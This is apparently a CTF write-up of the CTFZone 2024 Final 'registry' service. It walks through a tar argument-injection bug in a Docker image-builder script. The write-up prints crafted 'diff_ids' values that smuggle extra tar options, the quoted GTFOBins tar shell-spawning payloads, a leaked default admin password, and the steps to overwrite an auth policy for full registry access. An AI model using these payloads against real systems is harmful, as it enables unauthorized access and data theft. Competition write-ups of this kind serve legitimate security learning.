+++
title = 'CTFZone 2024 Final — registry'
date = 2024-11-26T00:49:23+03:00
tags = ['ctf', 'writeup', 'web', 'admin']
toc = true
+++

## Overview

We're given an Attack/Defense challenge containing 5 services:

- registration \
  A custom service written in Go, used to registering (adding to database) new accounts

- auth \
  Authentication server for Docker, based on [cesanta/docker_auth](https://github.com/cesanta/docker_auth) project

- registry \
  Container images distribution server, based on official implementation of registry [distribution/distribution](https://github.com/distribution/distribution)

- image-builder \
  A custom service written in Python and Bash, used to rebuild and flatten container images

- nginx \
  Reverse proxy, entry point to internal endpoints

The checker's flow is following:

1. Register new account at `/register` endpoint
2. Get access token at `/auth` using account credentials
3. Upload (push) a tarball with container image to registry
4. The image is processed asynchronously in image-builder service
5. Download (pull) modified image and check for flag persistence

Auth policy allows to pull (push, delete, etc) an image only for its owner, so it's not possible to register another account and pull checker's image. There is an internal account `service-user` used in image-builder, it has access to all images.

```yaml
acl:
  - match: { ip: "127.0.0.0/8" }
    actions: ["*"]
    comment: "Allow everything from localhost (IPv4)"

  - match: { ip: "::1" }
    actions: ["*"]
    comment: "Allow everything from localhost (IPv6)"

  - match: { account: "service-user" }
    actions: ["*"]
    comment: "Admin has full access to everything."

  - match: { account: "/.+/", name: "${account}/*" }
    actions: ["*"]
    comment: "Logged in users have full access to images that are in their 'namespace'"

  - match: { account: "/.+/", type: "registry", name: "catalog" }
    actions: ["*"]
    comment: "Logged in users can query the catalog."
```

In order to retrieve flag we need to download checker's image. It could be done with `service-user` account, but its credentials are randomly generated at startup:

```sh
if grep -q "service-password" /configs/.service_password; then
    PASSWORD=$(tr -dc a-z0-9 </dev/urandom | head -c 16)
    echo "registering administrator with creds $SERVICE_USER $PASSWORD"
    curl ...
    if [ $? -eq 0 ]; then
        sed -i "s/service-password/$PASSWORD/g" /configs/.service_password
        chmod 644 /configs/.service_password
    fi
    sleep 1
else
    echo "registering administrator with creds from /configs/.service_password"
    curl ...
fi
```

So there are several ways:

- bypass auth: create crafted account that would match policy
- obtain `service-user` credentials
- create another user with full access
- remote code execution in service working with registry or database

## Unintended vulnerability

Due to deploy mistake all vulnboxes have the same password for `service-user` account, it was probably generated during the testing and distributed with the entire challenge:

```
foufons1atxnrpia
```

First blood by [dtl](https://ctftime.org/team/157017/) exploited this vulnerability. We supposed that the password _actually_ was generated during the startup so didn't event checked this.

Since `service-user` has full access, it lead to destructive action: someone started to delete checker images from registry.

## Vulnerability

First we carefully read registration service, startup scripts, database and nginx configs. It became clear that this part doesn't contain any added vulnerabilities. So we splitted our investigation in two ways:

1. [renbou](https://t.me/renbou) started to read [cesanta/docker_auth](https://github.com/cesanta/docker_auth) source code in order to find a way to bypass auth policy

2. I started to examine image-builder service, since it contains impressive bash script and looks suspicious overall

After some time we decided that policy was implemented correctly, assuming that [cesanta/docker_auth](https://github.com/cesanta/docker_auth) is safe and does not contain any 0day vulnerabilities. On the other hand the [build.sh](/assets/ctfzone-2024-registry/build.sh) script is entirely handwritten and contains interesting part:

```sh
LAYERS=$(jq -r ".rootfs.diff_ids[1:$MAX_LAYERS_COUNT][]" $IMAGE_DIR/$CONFIGNAME)
BASE_LAYER=$(jq -r ".rootfs.diff_ids[0]" $IMAGE_DIR/$CONFIGNAME | sed "s/sha256://g")

# unpack layers
cd $IMAGE_DIR
mkdir .overlay
i=1
for l in $LAYERS; do
  LAYER=$(printf "$l"| sed "s/sha256://g").tar
  echo $LAYER
  tar -C .overlay -xf $LAYER --overwrite
  i=$((i+1))
  rm -f $IMAGE_DIR/$LAYER
done
```

For those who are familiar with bash exploitation it's straightforward: the `$LAYER` argument in `tar` command is not quoted, so it will be splitted by whitespace and expanded to several arguments. For example, if `$LAYER` contains `X Y Z`, the line become

```sh
tar -C .overlay -xf X Y Z --overwrite
```

The `l` variable can't contain whitespace, because `for` loop also uses it to split `$LAYERS` variable. But since there are call to `prinf`, we could replace whitespace with `\x20`:

```sh
$ printf "X\x20Y\x20Z"
X Y Z
```

The `$LAYERS` variable is constructed from `.rootfs.diff_ids` array in config file, and the config file itself is the part of image tarball. So if we upload a crafted tarball with custom `.rootfs.diff_ids` field we could inject it to `tar` command.

## Trigger

How to create such tarball? I decided to build custom Docker image:

```Dockerfile
FROM alpine:latest

RUN touch /tmp/vzlom
```

I used following commands to create _safe_ tarball:

```sh
$ docker build -t vzlom -f Dockerfile .
$ docker image save vzlom > vzlom.tar
```

The resulting tarball has content:

```
blobs/
blobs/sha256/
blobs/sha256/3a3688710208498d9f2acfd70943158de61368020992f8f9f240ab34bc5dfdef
blobs/sha256/54dcf28fd28c0a670a2b60cf8b2d315b705972f65e89189e97d81814db9cd5ed
blobs/sha256/71c6861c138b8141bf21e774e15d49699fc2454bb7f11425c48f4bf2af91912c
blobs/sha256/75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558
blobs/sha256/7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e
blobs/sha256/b17d896ce1034251f2642caa5d4b9f42782a557598792d33e811d723f127d332
index.json
manifest.json
oci-layout
repositories
```

The file `manifest.json` contains a path to config file:

```json
[
  {
    "Config": "blobs/sha256/b17d896ce1034251f2642caa5d4b9f42782a557598792d33e811d723f127d332",
    "RepoTags": ["vzlom:latest"],
    "Layers": [
      "blobs/sha256/75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558",
      "blobs/sha256/7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e"
    ],
    "LayerSources": {
      "sha256:75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558": {
        "mediaType": "application/vnd.oci.image.layer.v1.tar",
        "size": 8081920,
        "digest": "sha256:75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558"
      },
      "sha256:7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e": {
        "mediaType": "application/vnd.oci.image.layer.v1.tar",
        "size": 11776,
        "digest": "sha256:7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e"
      }
    }
  }
]
```

And config file contains the target `.rootfs.diff_ids` array:

```json
{
  "architecture": "amd64",
  "config": {
    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "Cmd": ["/bin/sh"],
    "WorkingDir": "/",
    "ArgsEscaped": true
  },
  "created": "2024-11-24T19:53:44.717222375+03:00",
  "history": [
    {
      "created": "2024-09-06T12:05:36Z",
      "created_by": "ADD alpine-minirootfs-3.20.3-x86_64.tar.gz / # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2024-09-06T12:05:36Z",
      "created_by": "CMD [\"/bin/sh\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    },
    {
      "created": "2024-11-24T19:53:44.717222375+03:00",
      "created_by": "RUN touch /tmp/vzlom # buildkit",
      "comment": "buildkit.dockerfile.v0"
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558",
      "sha256:7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e"
    ]
  }
}
```

Let's add something to this array, for example:

```json
"rootfs": {
  "type": "layers",
  "diff_ids": [
    "sha256:75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558",
    "sha256:7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e",
    "sha256:X\\x20Y\\x20Z"
  ]
}
```

Note that `sha256:` prefix will be removed. After this we need to pack the image to tarball and push it to registry. I tried many popular tools, but they used to verify hash and failed. Instead I've found a custom Python script with 12 stars: [docker-push](https://github.com/sdenel/docker-pull-push/blob/master/docker-push), and it worked.

Then image-builder service executed the following command:

```sh
tar -C .overlay -xf X Y Z.tar --overwrite
```

## Exploitation

What could we do with `tar` arguments injection? First I used [gtfobins](https://gtfobins.github.io/gtfobins/tar/) and tried to use RCE payloads:

```
Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

(a) tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

(b) This only works for GNU tar.

    tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'

(c) This only works for GNU tar. It can be useful when only a limited command argument injection is available.

    TF=$(mktemp)
    echo '/bin/sh 0<&1' > "$TF"
    tar cf "$TF.tar" "$TF"
    tar xf "$TF.tar" --to-command sh
    rm "$TF"*
```

Surprisingly they didn't worked, because we deal with non-gnu `tar`. The image-builder service used [busybox](https://www.busybox.net/) as base image, so their `tar` has only the following arguments:

```
/ # tar -h
BusyBox v1.36.1 (2024-06-10 07:11:47 UTC) multi-call binary.

Usage: tar c|x|t [-ZzJjahmvokO] [-f TARFILE] [-C DIR] [-T FILE] [-X FILE] [LONGOPT]... [FILE]...

Create, extract, or list files from a tar file

	c	Create
	x	Extract
	t	List
	-f FILE	Name of TARFILE ('-' for stdin/out)
	-C DIR	Change to DIR before operation
	-v	Verbose
	-O	Extract to stdout
	-m	Don't restore mtime
	-o	Don't restore user:group
	-k	Don't replace existing files
	-Z	(De)compress using compress
	-z	(De)compress using gzip
	-J	(De)compress using xz
	-j	(De)compress using bzip2
	--lzma	(De)compress using lzma
	-a	(De)compress based on extension
	-h	Follow symlinks
	-T FILE	File with names to include
	-X FILE	File with glob patterns to exclude
	--exclude PATTERN	Glob pattern to exclude
	--overwrite		Replace existing files
	--strip-components NUM	NUM of leading components to strip
	--no-recursion		Don't descend in directories
	--numeric-owner		Use numeric user:group
	--no-same-permissions	Don't restore access permissions
```

After some thinking I've decided to put another crafted tarball in my image and extract it later. This way I would get arbitrary file write primitive. Let's add it to Dockerfile:

```Dockerfile
FROM alpine:latest

ADD vzlomik.tar /vzlomik.tar
```

Therefore I've changed the injection. I wanted to unpack my tarball in the filesystem root, so `.rootfs.diff_ids` became:

```json
"rootfs": {
  "type": "layers",
  "diff_ids": [
    "sha256:75654b8eeebd3beae97271a102f57cdeb794cc91e442648544963a7e951e9558",
    "sha256:7ed7aa814b865edc71b766dcf2d45f0a47077c5752984b9f3a7beb1bbbab097e",
    "sha256:.overlay/vzlomik.tar\\x20-C\\x20/\\x20-xf\\x20.overlay/vzlomik"
  ]
}
```

And the executed `tar` command:

```sh
tar -C .overlay -xf .overlay/vzlomik.tar -C / -xf .overlay/vzlomik.tar --overwrite
```

The file `vzlomik.tar` is already presented in `.overlay` from the previous image layer, so this command will change directory to `/` and extract `vzlomik.tar`.

Since the image-builder was running from `root` user, we could easily get RCE just by replacing `/usr/bin/skopeo` with our custom binary or shell script, but [renbou](https://t.me/renbou) suggested another clever way: replace `auth_config.yml`. It was possible because volumes for all containers were mounted with readwrite access. We registered new `service_user` account and grant it full access:

```yaml
- match: { account: "service-user" }
  actions: ["*"]
  comment: "Admin has full access to everything."

- match: { account: "service_user" }
  actions: ["*"]
  comment: "Admin has full access to everything."
```

All that's left to do is to use this account and download all checker images.

So, again:

1. edit `auth_config.yml` and save it to `vzlomik.tar` at path `/configs/auth_config.yml`
2. build custom image `vzlom` with `vzlomik.tar` in filesystem
3. edit `.rootfs.diff_ids` in config file of `vzlom.tar`
4. push `vzlom.tar` to registry
5. wait until image-builder processed this image
6. use `service_user` account to download all images

## Conclusion

I want to thank the organizing teams ([BIZone](https://ctftime.org/team/32190) and [SPRUSH](https://ctftime.org/team/76463/)) for such quality and interesting service. The bug utilizes different behaviour between command-line tools and official image registry. But I felt a little disappointed when noticed that `service-user` password, that _should_ be generated separately for each vulnbox, was the same.
